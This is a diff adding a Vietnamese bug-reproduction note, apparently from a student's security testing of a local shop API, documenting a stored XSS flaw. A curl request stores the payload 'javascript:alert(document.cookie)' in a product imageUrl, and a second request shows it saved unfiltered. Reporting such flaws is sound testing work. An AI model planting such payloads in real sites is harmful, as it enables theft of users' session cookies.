@@ -1,0 +1,12 @@
+Tai hien loi — SUT: http://localhost:3000/api
+Thoi diem   : 2026-09-02 16:20:53 +0700
+Student ID  : 23127195 (moi request deu mang header X-Student-Id)
+
+
+### BUG-A3-11 [Medium] imageUrl chap nhan giao thuc javascript: (vector stored XSS)
+
+$ curl -s -X POST $B/admin/import-products $H -H 'Authorization: Bearer $ADMIN_TOKEN' -d '{"products":[{"name":"JSURL-23127195","price":1000,"imageUrl":"javascript:alert(document.cookie)","category_id":1}]}'
+{"message":"Import hoàn tất: 1/1 sản phẩm được thêm","inserted":1,"errors":[]}   gia tri imageUrl duoc luu nguyen van, khong bi loc:
+
+$ curl -s $B/products?search=JSURL-23127195 $H
+[{"id":23,"name":"JSURL-23127195","price":1000,"description":"","imageUrl":"javascript:alert(document.cookie)","category_id":1}]
